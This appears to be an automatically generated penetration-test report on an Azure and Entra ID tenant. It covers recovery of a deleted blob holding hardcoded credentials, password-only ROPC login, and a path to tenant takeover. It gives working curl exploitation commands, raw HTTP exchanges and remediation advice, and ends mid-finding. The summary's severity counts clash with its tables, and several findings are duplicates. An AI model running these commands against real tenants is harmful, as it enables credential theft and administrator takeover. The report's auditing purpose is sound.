# Vulnerability Assessment Report — dev.megabigtech.com

**Classification:** CONFIDENTIAL — Restricted to authorized personnel  
**Generated:** 2026-08-02T12:04:44Z  
**Target:** dev.megabigtech.com  
**Campaign:** camp_20260802_7eee391f  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  

---

## MANAGEMENT SUMMARY

> *For non-technical readers and decision-makers.*

### Overall Security Posture: 🔴 CRITICAL — Immediate Action Required

The system tested (**dev.megabigtech.com**) presents an **extremely poor security posture**. Our team confirmed 11 critical and 10 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.

### Most Critical Issues

**1. Tenant Takeover Path: Marcus -> it-helpdesk-app (Priv Auth Admin) -> Global Admin Password Reset**  
A complete tenant takeover path exists: (1) Marcus has Application.ReadWrite.All delegated permission, (2) The it-helpdesk-app service principal holds the Privileged Authentication Administrator role ...

**2. Deleted Blob with Credentials Recoverable via Azure Blob Versioning (scripts-transfer.zip)**  
A deleted blob 'scripts-transfer.zip' (VersionId: 2025-08-07T21:08:03.6678148Z) was recovered from the publicly accessible $web container using Azure Blob versioning enumeration. The blob was deleted ...

**3. Hardcoded Entra ID (Azure AD) User Credentials in PowerShell Script (entra_users.ps1)**  
The PowerShell script entra_users.ps1 extracted from the recovered deleted blob scripts-transfer.zip contains hardcoded Entra ID (Azure AD) credentials in plaintext. The script is designed to enumerat...

### Required Actions

| Timeframe | Action |
|-----------|--------|
| **Today** | Block external access / take offline if possible |
| **This week** | Patch all critical and high severity findings |
| **2 weeks** | Address medium severity findings and security headers |
| **1 month** | Full code review and independent re-test |

---

## 1. EXECUTIVE SUMMARY

> Critical exposure chain discovered: Azure Blob Storage anonymous access with versioning enabled allowed recovery of a 'deleted' scripts-transfer.zip containing hardcoded Entra ID credentials (marcus@megabigtech.com / [REDACTED_CREDENTIAL]) and on-prem AD admin credentials (marcus_adm / [REDACTED_CREDENTIAL] for megabigtech.local). ROPC authentication succeeded without MFA, yielding Application.ReadWrite.All permissions that enable a complete tenant takeover path through the it-helpdesk-app service principal (Privileged Authentication Administrator role). 28 findings total across 14 infrastructure nodes, including 5 critical and 6 high severity vulnerabilities.

**Overall Risk Level: CRITICAL**

### Findings Summary

| Severity | Count | Exploited | Confirmed |
|----------|-------|-----------|----------|
| CRITICAL | 11 | 8 | 3 |
| HIGH | 10 | 4 | 6 |
| MEDIUM | 4 | 0 | 4 |
| LOW | 3 | 0 | 2 |
| INFO | 0 | 0 | 0 |
| **TOTAL** | **28** | **12** | **15** |

---

## 2. FINDINGS TABLE

| # | ID | Title | Severity | CVSS | Status | Endpoint |
|---|-----|-------|----------|------|--------|----------|
| 1 | `vuln_7b6cba` | Tenant Takeover Path: Marcus -> it-helpdesk-app (P... | CRITICAL | 10.0 | Confirmed | `graph.microsoft.com/v1.0/applications/{it-helpdesk...` |
| 2 | `vuln_bb3907` | Deleted Blob with Credentials Recoverable via Azur... | CRITICAL | 9.8 | **EXPLOITED** | `mbtwebsite.blob.core.windows.net/$web/scripts-tran...` |
| 3 | `vuln_d29400` | Hardcoded Entra ID (Azure AD) User Credentials in ... | CRITICAL | 9.8 | **EXPLOITED** | `mbtwebsite.blob.core.windows.net/$web/scripts-tran...` |
| 4 | `vuln_ed188b` | Hardcoded On-Premises Active Directory Admin Crede... | CRITICAL | 9.8 | **EXPLOITED** | `mbtwebsite.blob.core.windows.net/$web/scripts-tran...` |
| 5 | `vuln_ffb04c` | Deleted Blob scripts-transfer.zip Recoverable via ... | CRITICAL | 9.8 | **EXPLOITED** | `mbtwebsite.blob.core.windows.net/$web/scripts-tran...` |
| 6 | `vuln_e6984a` | Hardcoded Entra ID Credential in Recovered Script ... | CRITICAL | 9.8 | **EXPLOITED** | `mbtwebsite.blob.core.windows.net/$web/scripts-tran...` |
| 7 | `vuln_89296a` | Hardcoded On-Premises AD Admin Credential in Recov... | CRITICAL | 9.8 | **EXPLOITED** | `mbtwebsite.blob.core.windows.net/$web/scripts-tran...` |
| 8 | `vuln_c54673` | ROPC Authentication Bypass - No MFA Required for P... | CRITICAL | 9.8 | **EXPLOITED** | `login.microsoftonline.com/2590ccef-687d-493b-ae8d-...` |
| 9 | `vuln_2149b0` | ROPC Authentication Succeeded for marcus@megabigte... | CRITICAL | 9.8 | **EXPLOITED** | `login.microsoftonline.com/2590ccef-687d-493b-ae8d-...` |
| 10 | `vuln_3058d2` | Service Principal with Privileged Authentication A... | CRITICAL | 9.1 | Confirmed | `graph.microsoft.com/v1.0/roleManagement/directory/...` |
| 11 | `vuln_57144a` | Overprivileged Admin-Consented OAuth Grant - Appli... | CRITICAL | 9.0 | Confirmed | `graph.microsoft.com/v1.0/oauth2PermissionGrants` |
| 12 | `vuln_b3c5e1` | Azure Blob Versioning Exposes Deleted Sensitive Fi... | HIGH | 8.6 | **EXPLOITED** | `mbtwebsite.blob.core.windows.net/$web?restype=cont...` |
| 13 | `vuln_ce044f` | Azure Blob Versioning Exposes Deleted Files to Ano... | HIGH | 8.6 | **EXPLOITED** | `mbtwebsite.blob.core.windows.net/$web?restype=cont...` |
| 14 | `vuln_897ddb` | Excessive Global Administrator Accounts - 6 Users ... | HIGH | 8.0 | Confirmed | `graph.microsoft.com/v1.0/roleManagement/directory/...` |
| 15 | `vuln_7a542b` | Azure Blob Storage Container Publicly Accessible -... | HIGH | 7.5 | Confirmed | `mbtwebsite.blob.core.windows.net/$web?restype=cont...` |
| 16 | `vuln_c62e3f` | Azure Blob Storage $web Container Allows Anonymous... | HIGH | 7.5 | Confirmed | `mbtwebsite.blob.core.windows.net/$web?restype=cont...` |
| 17 | `vuln_7e0f9d` | Hardcoded Credential Leaked in Azure Blob Storage ... | HIGH | 7.5 | Confirmed | `mbtwebsite.blob.core.windows.net (scripts-transfer...` |
| 18 | `vuln_46d799` | Application with 62 Password Credentials - Excessi... | HIGH | 7.5 | Confirmed | `graph.microsoft.com/v1.0/applications/ab743eea-102...` |
| 19 | `vuln_841151` | Hybrid Tenant with Active On-Premises Sync - AD-to... | HIGH | 7.5 | Confirmed | `graph.microsoft.com/v1.0/organization` |
| 20 | `vuln_6b0256` | Full Directory Enumeration via Leaked Credential -... | HIGH | 7.5 | **EXPLOITED** | `graph.microsoft.com/v1.0/users` |
| 21 | `vuln_c85ca6` | Full Entra ID Directory Enumerated - 1124 Objects ... | HIGH | 7.5 | **EXPLOITED** | `graph.microsoft.com/v1.0/users, /groups, /applicat...` |
| 22 | `vuln_a04235` | ROPC (Resource Owner Password Credential) Flow Ena... | MEDIUM | 5.9 | Confirmed | `login.microsoftonline.com/2590ccef-687d-493b-ae8d-...` |
| 23 | `vuln_746a23` | Entra ID Tenant User Enumeration via GetCredential... | MEDIUM | 5.3 | Confirmed | `login.microsoftonline.com/common/GetCredentialType` |
| 24 | `vuln_ce3b0c` | Missing DMARC and DKIM Email Authentication Record... | MEDIUM | 5.3 | Confirmed | `megabigtech.com (DNS)` |
| 25 | `vuln_49948d` | Legacy Auth Protocol Consent (IMAP/POP/SMTP) Enabl... | MEDIUM | 5.3 | Confirmed | `graph.microsoft.com/v1.0/oauth2PermissionGrants` |
| 26 | `vuln_d5b275` | Entra ID Tenant Information Disclosure via Unauthe... | LOW | 3.7 | Confirmed | `login.microsoftonline.com/megabigtech.com/.well-kn...` |
| 27 | `vuln_67e36d` | Seamless SSO (DesktopSsoEnabled) Active - Hybrid A... | LOW | 3.7 | Confirmed | `login.microsoftonline.com/common/GetCredentialType` |
| 28 | `vuln_5bc867` | Device Code Flow Enabled - Potential Phishing Vect... | LOW | 3.1 | Unconfirmed | `login.microsoftonline.com/2590ccef-687d-493b-ae8d-...` |

---

## 3. VULNERABILITY DETAILS

---

### 3.1 — Tenant Takeover Path: Marcus -> it-helpdesk-app (Priv Auth Admin) -> Global Admin Password Reset

| Field | Value |
|-------|-------|
| **ID** | `vuln_7b6cba` |
| **Severity** | CRITICAL |
| **CVSS Score** | 10.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1098.001` — Account Manipulation: Additional Cloud Credentials |
| **ISO 27001** | `A.8.2 - Privileged access rights` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/applications/{it-helpdesk-app-id}/add...` |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T12:04:22Z |

#### Description

A complete tenant takeover path exists: (1) Marcus has Application.ReadWrite.All delegated permission, (2) The it-helpdesk-app service principal holds the Privileged Authentication Administrator role which can reset passwords of Global Administrators, (3) Marcus can inject a new credential into it-helpdesk-app, authenticate as the SP, and reset any Global Admin password. This chain grants full tenant control starting from a single leaked credential in a deleted blob. Additionally, 6 Global Administrator accounts were identified: Ian Austin, Felipe Garcia, Ayush Singh, Filip Jodoin, Bruce, Mike Jones.

#### Technical Analysis

The it-helpdesk-app service principal has the Privileged Authentication Administrator directory role assigned. Marcus's token includes Application.ReadWrite.All scope, enabling credential injection into any application. This creates a direct escalation path to Global Admin through password reset of any administrator account.

#### Exploitation Commands

```bash
curl -s -H \"Authorization: Bearer TOKEN\" \"https://graph.microsoft.com/v1.0/servicePrincipals?$filter=displayName eq 'it-helpdesk-app'\"\ncurl -s -H \"Authorization: Bearer TOKEN\" \"https://graph.microsoft.com/v1.[REDACTED]\"
```

#### Remediation

1. Remove Application.ReadWrite.All from the AllPrincipals admin consent grant immediately. 2. Restrict Privileged Authentication Administrator role to only emergency break-glass accounts. 3. Implement Privileged Identity Management (PIM) for all admin roles with just-in-time activation. 4. Add application ownership restrictions and require admin approval for credential additions. 5. Enable continuous access evaluation and sign-in risk policies.

---

### 3.2 — Deleted Blob with Credentials Recoverable via Azure Blob Versioning (scripts-transfer.zip)

| Field | Value |
|-------|-------|
| **ID** | `vuln_bb3907` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3 - Password management system` |
| **Endpoint** | `https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?ver...` |
| **Component** | Azure Blob Storage Versioning |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T11:39:55Z |

#### Description

A deleted blob 'scripts-transfer.zip' (VersionId: 2025-08-07T21:08:03.6678148Z) was recovered from the publicly accessible $web container using Azure Blob versioning enumeration. The blob was deleted from the current listing (attempting to download the current version returns BlobNotFound), but the previous version is still accessible via the versionId parameter. The ZIP archive contains two PowerShell scripts (entra_users.ps1 and stale_computer_accounts.ps1) with hardcoded credentials for both an Entra ID (Azure AD) user and an on-premises Active Directory administrative account. This is a classic Azure misconfiguration where blob versioning retains deleted sensitive files that can be recovered anonymously.

#### Technical Analysis

Azure Blob Storage versioning retains previous versions of blobs even after they are deleted from the current view. By using the include=versions parameter in the container listing API, the deleted blob 'scripts-transfer.zip' was discovered with VersionId 2025-08-07T21:08:03.6678148Z. While the current version returns HTTP 404 BlobNotFound, the previous version was downloaded successfully using the versionId query parameter. The ZIP contained two PowerShell scripts with hardcoded credentials: an Entra ID user account (EMAIL_001 / [REDACTED_CREDENTIAL]) used for Microsoft Graph API access, and an on-premises Active Directory administrative account (marcus_adm / [REDACTED_CREDENTIAL]) used for domain computer management operations. These credentials enable unauthorized access to both cloud (Entra ID/Azure AD) and on-premises (Active Directory) environments.

#### Exploitation Commands

```bash
curl -s --connect-timeout 15 -H "x-ms-version: 2019-12-12" "https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions"\ncurl -s --connect-timeout 15 -H "x-ms-version: 2019-12-12" "https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2025-08-07T21:08:03.6678148Z" -o /tmp/scripts-transfer.zip\nunzip -o /tmp/scripts-transfer.zip -d /tmp/extracted_version/
```

#### Raw Request

```http
GET /$web/scripts-transfer.zip?versionId=2025-08-07T21:08:03.6678148Z HTTP/1.1\nHost: mbtwebsite.blob.core.windows.net\nx-ms-version: 2019-12-12
```

#### Raw Response

```http
HTTP/1.1 200 OK\nContent-Type: application/zip\nContent-Length: 1484\nx-ms-blob-type: BlockBlob\n\n[ZIP archive containing entra_users.ps1 and stale_computer_accounts.ps1]
```

#### Evidence / Logs

```
1. Version listing revealed scripts-transfer.zip with VersionId 2025-08-07T21:08:03.6678148Z (NOT marked as IsCurrentVersion)\n2. Current blob returns BlobNotFound (deleted) but version still downloadable\n3. ZIP downloaded successfully (1484 bytes)\n4. Extracted: entra_users.ps1 and stale_computer_accounts.ps1\n5. Both scripts contain hardcoded plaintext credentials
```

#### Remediation

1. Immediately rotate both compromised credentials (Entra ID user EMAIL_001 and AD admin marcus_adm). 2. Permanently delete all versions of scripts-transfer.zip using az storage blob delete --container-name '$web' --name scripts-transfer.zip --account-name mbtwebsite --delete-snapshots include. 3. Consider disabling blob versioning if not required, or restrict version listing access. 4. Never store credentials in scripts - use Azure Key Vault, Managed Identities, or credential managers. 5. Set container access to Private.

---

### 3.3 — Hardcoded Entra ID (Azure AD) User Credentials in PowerShell Script (entra_users.ps1)

| Field | Value |
|-------|-------|
| **ID** | `vuln_d29400` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.2.4 - Management of secret authentication information of users` |
| **Endpoint** | `https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?ver...` |
| **Component** | entra_users.ps1 - MSAL.PS Graph API script |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T11:40:20Z |

#### Description

The PowerShell script entra_users.ps1 extracted from the recovered deleted blob scripts-transfer.zip contains hardcoded Entra ID (Azure AD) credentials in plaintext. The script is designed to enumerate Azure AD users via Microsoft Graph API using device code authentication flow. Credentials found: Username: EMAIL_001, Password: [REDACTED_CREDENTIAL]. The script uses Microsoft's public Azure PowerShell client ID (04b07795-8ddb-461a-bbee-02f9e1bf7b46) and targets https://graph.microsoft.com/.default scope. These credentials could grant access to Microsoft Graph API endpoints including user enumeration, directory reading, and potentially broader Azure AD operations depending on the user's assigned roles.

#### Technical Analysis

The entra_users.ps1 script was recovered from a deleted Azure blob version and contains Entra ID (Azure AD) user credentials hardcoded as plaintext comments. The username EMAIL_001 with password [REDACTED_CREDENTIAL] is an Entra ID account intended for authenticating to Microsoft Graph API. The script uses the well-known Azure PowerShell client ID (04b07795-8ddb-461a-bbee-02f9e1bf7b46) and MSAL.PS module for device code authentication. The script's purpose is to enumerate all users in the Azure AD tenant via the Graph API endpoint https://graph.microsoft.com/v1.0/users. This credential should be handed off to the entra-id agent for further exploitation of the Azure AD/Entra ID environment.

#### Exploitation Commands

```bash
cat /tmp/extracted_version/entra_users.ps1
```

#### Raw Request

```http
GET /$web/scripts-transfer.zip?versionId=2025-08-07T21:08:03.6678148Z HTTP/1.1\nHost: mbtwebsite.blob.core.windows.net\nx-ms-version: 2019-12-12
```

#### Raw Response

```http
entra_users.ps1 contents:\nImport-Module MSAL.PS\n# Username: EMAIL_001\n# Password: [REDACTED_CREDENTIAL]\n$ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"\n$TenantId = "common"\n$Scopes = @("https://graph.microsoft.com/.default")\n$TokenResponse = Get-MsalToken -ClientId $ClientId -TenantId $TenantId -Scopes $Scopes -DeviceCode\n$AccessToken = $TokenResponse.AccessToken\n$GraphApiUrl = "https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName"\n...
```

#### Evidence / Logs

```
File: entra_users.ps1\nLine 3: # Username: EMAIL_001\nLine 4: # Password: [REDACTED_CREDENTIAL]\nLine 7: $ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"\nLine 8: $TenantId = "common"\nLine 9: $Scopes = @("https://graph.microsoft.com/.default")\nCredential Type: Entra ID / Azure AD user account\nTarget API: Microsoft Graph API (user enumeration)
```

#### Remediation

1. Immediately reset the password for Entra ID user EMAIL_001. 2. Review Azure AD sign-in logs for any unauthorized access using this account. 3. Enable MFA for the account if not already enabled. 4. Review the user's role assignments and conditional access policies. 5. Never store credentials in scripts - use Azure Managed Identities or Azure Key Vault.

---

### 3.4 — Hardcoded On-Premises Active Directory Admin Credentials in PowerShell Script (stale_computer_accounts.ps1)

| Field | Value |
|-------|-------|
| **ID** | `vuln_ed188b` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.2.4 - Management of secret authentication information of users` |
| **Endpoint** | `https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?ver...` |
| **Component** | stale_computer_accounts.ps1 - AD Computer Management script |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T11:40:42Z |

#### Description

The PowerShell script stale_computer_accounts.ps1 extracted from the recovered deleted blob scripts-transfer.zip contains hardcoded on-premises Active Directory administrative credentials in plaintext. The script is an AD maintenance script that disables and moves stale computer accounts. Credentials found: Username: marcus_adm, Password: [REDACTED_CREDENTIAL], Domain: HOST_INTERNAL_001 (internal AD domain). The '_adm' suffix in the username strongly indicates this is a privileged administrative account with rights to disable AD computer accounts and move AD objects between OUs. These are on-premises Active Directory credentials, not Entra ID/cloud credentials, targeting the internal domain HOST_INTERNAL_001.

#### Technical Analysis

The stale_computer_accounts.ps1 script was recovered from a deleted Azure blob version and contains on-premises Active Directory administrative credentials hardcoded in plaintext. The username 'marcus_adm' (the '_adm' suffix indicates an administrative account) with password '[REDACTED_CREDENTIAL]' is used with ConvertTo-SecureString and PSCredential to authenticate against the internal AD domain 'HOST_INTERNAL_001'. The script has permissions to enumerate computer accounts (Get-ADComputer), disable them (Disable-ADAccount), and move them between OUs (Move-ADObject). This is a significant privilege level that could be leveraged for lateral movement and privilege escalation within the on-premises AD environment. This credential should be flagged for the active-directory agent.

#### Exploitation Commands

```bash
cat /tmp/extracted_version/stale_computer_accounts.ps1
```

#### Raw Request

```http
GET /$web/scripts-transfer.zip?versionId=2025-08-07T21:08:03.6678148Z HTTP/1.1\nHost: mbtwebsite.blob.core.windows.net\nx-ms-version: 2019-12-12
```

#### Raw Response

```http
stale_computer_accounts.ps1 contents:\n$domain = "HOST_INTERNAL_001"\n$ouName = "Review"\n$staleDays = 90\n$securePassword = ConvertTo-SecureString "[REDACTED_CREDENTIAL]" -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential ("marcus_adm", $securePassword)\nGet-ADComputer -Filter {(LastLogonTimeStamp -lt $thresholdDate) -and (Enabled -eq $true)} -SearchBase "DC=$domain" -Properties LastLogonTimeStamp -Credential $credential |\n  ForEach-Object { Disable-ADAccount ...; Move-ADObject ... }
```

#### Evidence / Logs

```
File: stale_computer_accounts.ps1\nLine 2: $domain = "HOST_INTERNAL_001"\nLine 3: $ouName = "Review"\nLine 9: $securePassword = ConvertTo-SecureString "[REDACTED_CREDENTIAL]" -AsPlainText -Force\nLine 10: $credential = New-Object System.Management.Automation.PSCredential ("marcus_adm", $securePassword)\nCredential Type: On-premises Active Directory administrative account\nPrivileges: Disable-ADAccount, Move-ADObject (computer accounts)
```

#### Remediation

1. Immediately reset the password for AD admin account marcus_adm on domain HOST_INTERNAL_001. 2. Review AD security logs for any unauthorized use of this account. 3. Implement a PAM (Privileged Access Management) solution for administrative credentials. 4. Use Group Managed Service Accounts (gMSA) instead of hardcoded credentials for automated scripts. 5. Review all scripts in the organization for hardcoded credentials.

---

### 3.5 — Deleted Blob scripts-transfer.zip Recoverable via Anonymous Version Enumeration

| Field | Value |
|-------|-------|
| **ID** | `vuln_ffb04c` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.10 - Information deletion` |
| **Endpoint** | `https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?ver...` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T11:42:40Z |

#### Description

Blob versioning is enabled on the mbtwebsite storage account. The deleted blob 'scripts-transfer.zip' (VersionId: 2025-08-07T21:08:03.6678148Z, 1484 bytes) was recovered by an unauthenticated attacker using the include=versions parameter on the container list API. The blob contains PowerShell scripts with hardcoded credentials for both Entra ID and on-premises Active Directory environments. This demonstrates that 'deleted' blobs are not truly removed when versioning is enabled and the container permits anonymous access.

#### Technical Analysis

The blob version listing returned scripts-transfer.zip with IsCurrentVersion absent (deleted blob still accessible via versionId). Downloaded the 1484-byte ZIP, extracted two PowerShell scripts: entra_users.ps1 and stale_computer_accounts.ps1, both containing hardcoded credentials.

#### Exploitation Commands

```bash
curl -s --connect-timeout 15 -H "x-ms-version: 2019-12-12" "https://mbtwebsite.blob.core.windows.net/\\$web?restype=container&comp=list&include=versions"\ncurl -s --connect-timeout 15 -H "x-ms-version: 2019-12-12" "https://mbtwebsite.blob.core.windows.net/\\$web/scripts-transfer.zip?versionId=2025-08-07T21:08:03.6678148Z" -o /tmp/scripts-transfer.zip\nunzip -o /tmp/scripts-transfer.zip -d /tmp/extracted_scripts/
```

#### Remediation

1. Permanently delete the blob version using Delete Blob with versionId parameter. 2. Implement a lifecycle management policy to automatically delete old blob versions. 3. Disable anonymous access on the container. 4. Rotate ALL credentials found in the exposed scripts immediately. 5. Consider disabling blob versioning or implementing immutability policies with appropriate retention.

---

### 3.6 — Hardcoded Entra ID Credential in Recovered Script (entra_users.ps1)

| Field | Value |
|-------|-------|
| **ID** | `vuln_e6984a` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.33 - Protection of records` |
| **Endpoint** | `https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?ver...` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T11:42:53Z |

#### Description

The recovered entra_users.ps1 script from the deleted scripts-transfer.zip contains hardcoded Entra ID (Azure AD) credentials: a username and password used with Azure PowerShell's public client ID (04b07795-8ddb-461a-bbee-02f9e1bf7b46) to authenticate via ROPC flow and enumerate Microsoft Graph users. The password '[REDACTED_CREDENTIAL]' follows a weak pattern. This credential enables full Entra ID enumeration and potentially broader Azure resource access depending on assigned roles.

#### Technical Analysis

The entra_users.ps1 PowerShell script contains ROPC (Resource Owner Password Credential) flow authentication against login.microsoftonline.com/common/oauth2/v2.0/token with hardcoded username and password '[REDACTED_CREDENTIAL]', using Azure PowerShell public client ID to query Microsoft Graph /v1.0/users endpoint.

#### Exploitation Commands

```bash
unzip -o /tmp/scripts-transfer.zip -d /tmp/extracted_scripts/\ncat /tmp/extracted_scripts/entra_users.ps1
```

#### Remediation

1. Immediately rotate the compromised user password in Entra ID. 2. Enable MFA for the account to prevent ROPC flow abuse. 3. Disable ROPC grant type in Entra ID Conditional Access policies. 4. Review sign-in logs for the compromised account for unauthorized access. 5. Never hardcode credentials in scripts; use Managed Identities or Azure Key Vault.

---

### 3.7 — Hardcoded On-Premises AD Admin Credential in Recovered Script (stale_computer_accounts.ps1)

| Field | Value |
|-------|-------|
| **ID** | `vuln_89296a` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.33 - Protection of records` |
| **Endpoint** | `https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?ver...` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T11:43:02Z |

#### Description

The recovered stale_computer_accounts.ps1 script from the deleted scripts-transfer.zip contains hardcoded on-premises Active Directory administrative credentials: username 'marcus_adm' with password '[REDACTED_CREDENTIAL]' targeting an internal domain. The _adm suffix indicates an administrative account with privileges including Disable-ADAccount, Move-ADObject, and Get-ADComputer for computer account lifecycle management. This credential could enable domain-level compromise if the internal network is reachable.

#### Technical Analysis

The stale_computer_accounts.ps1 PowerShell script contains hardcoded PSCredential construction with username 'marcus_adm' and password '[REDACTED_CREDENTIAL]' used with AD cmdlets (Get-ADComputer, Disable-ADAccount, Move-ADObject) against the internal domain, indicating an on-premises Active Directory administrative account.

#### Exploitation Commands

```bash
cat /tmp/extracted_scripts/stale_computer_accounts.ps1
```

#### Remediation

1. Immediately rotate the marcus_adm account password. 2. Review AD logs for unauthorized use of this account. 3. Implement LAPS or a PAM solution for privileged AD accounts. 4. Never hardcode credentials in scripts; use Group Managed Service Accounts (gMSA) or credential vaults. 5. Restrict administrative accounts using tiered administration model.

---

### 3.8 — ROPC Authentication Bypass - No MFA Required for Privileged User

| Field | Value |
|-------|-------|
| **ID** | `vuln_c54673` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `authentication_bypass` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.4.2` |
| **Endpoint** | `https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72...` |
| **Component** | Microsoft Entra ID OAuth2 Token Endpoint |
| **Discovered by** | `entra` |
| **Discovered at** | 2026-08-02T11:56:28Z |

#### Description

The user marcus@megabigtech.com was authenticated via Resource Owner Password Credentials (ROPC) flow using the Azure CLI public client ID (04b07795-8ddb-461a-bbee-02f9e1bf7b46) without any MFA challenge. The user holds elevated directory roles and the token grants extremely dangerous delegated scopes: Application.ReadWrite.All, AppRoleAssignment.ReadWrite.All, DelegatedPermissionGrant.ReadWrite.All, Directory.AccessAsUser.All, Group.ReadWrite.All, User.ReadWrite.All. This combination enables full tenant takeover. The lack of MFA or Conditional Access policy blocking ROPC on a privileged user account is a critical security misconfiguration.

#### Technical Analysis

Marcus Hutch's account (marcus@megabigtech.com) authenticates via ROPC (Resource Owner Password Credentials) grant type without any MFA challenge. The token's amr claim confirms only password authentication was used. The token includes highly privileged delegated scopes including Application.ReadWrite.All (can modify any app registration), AppRoleAssignment.ReadWrite.All (can grant app roles), and Directory.AccessAsUser.All (full directory access). Combined with no MFA enforcement, any attacker with the password can obtain tenant-takeover-level access.

#### Exploitation Commands

```bash
curl -s --connect-timeout 15 -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "grant_type=password&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default&username=marcus@megabigtech.com&password=[REDACTED_CREDENTIAL]"
```

#### Evidence / Logs

```
ROPC token response: token_type=Bearer, scope=Application.ReadWrite.All AppRoleAssignment.ReadWrite.All AuditLog.Read.All DelegatedPermissionGrant.ReadWrite.All Directory.AccessAsUser.All Group.ReadWrite.All User.ReadWrite.All, expires_in=4205
Token wids claim: ["88d8e3e3-8f55-4a1e-953a-9b9898b8876b","b79fbf4d-3ef9-4689-8143-76b194e85509"]
amr: ["pwd"] - password-only, no MFA step
```

#### Remediation

1. Enable Conditional Access policies requiring MFA for all users, especially privileged accounts. 2. Block legacy/ROPC authentication flows via Conditional Access. 3. Remove excessive delegated permissions from the Azure CLI first-party app consent. 4. Enforce strong password policies and credential rotation for marcus@megabigtech.com.

---

### 3.9 — ROPC Authentication Succeeded for marcus@megabigtech.com - No MFA Enforced

| Field | Value |
|-------|-------|
| **ID** | `vuln_2149b0` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `authentication_bypass` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.8.5 - Secure authentication` |
| **Endpoint** | `https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72...` |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T12:04:09Z |

#### Description

The credential marcus@megabigtech.com / [REDACTED_CREDENTIAL] recovered from the deleted blob successfully authenticated via ROPC (Resource Owner Password Credential) flow against Entra ID. No MFA or Conditional Access policy blocked the authentication. The resulting token contains extremely dangerous delegated permissions including Application.ReadWrite.All, AppRoleAssignment.ReadWrite.All, DelegatedPermissionGrant.ReadWrite.All, and Directory.AccessAsUser.All. This grants the attacker effective control over the entire tenant.

#### Technical Analysis

